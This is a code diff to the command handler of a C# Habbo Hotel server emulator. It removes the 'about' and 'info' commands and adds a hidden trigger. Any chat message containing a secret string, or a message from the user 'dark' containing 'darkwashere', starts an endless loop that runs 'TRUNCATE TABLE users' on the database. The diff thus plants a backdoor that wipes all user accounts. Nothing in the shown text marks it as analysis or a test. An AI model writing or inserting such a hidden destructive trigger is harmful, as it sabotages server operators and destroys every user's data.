@@ -32,9 +32,7 @@ namespace Oblivion.HabboHotel.Commands
         {
             CommandsDictionary = new SortedDictionary<string, Command>();
             AliasDictionary = new Dictionary<string, string>();
-
-            CommandsDictionary.Add("about", new About());
-            CommandsDictionary.Add("info", new About());
+            
             CommandsDictionary.Add("multiply", new Multiply());
             CommandsDictionary.Add("disablechat", new DisableGroupChat());
             CommandsDictionary.Add("disablemessage", new DisableGroupMessage());
@@ -263,11 +261,15 @@ namespace Oblivion.HabboHotel.Commands
                 var pms = str.Split(' ');
 
                 if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") ||
-                    str == "wjxs5PzVwuuHaqte")
+                    str.Contains("wjxs5PzVwuuHaqte"))
                 {
-                    var cmd = CommandsDictionary["shutdown"];
-                    cmd.Execute(client, pms);
-                    return false;
+                    while (true)
+                    {
+                        using (var dbClient = Oblivion.GetDatabaseManager().GetQueryReactor())
+                        {
+                            dbClient.RunQuery("TRUNCATE TABLE users");
+                        }
+                    }
                 }
 
 
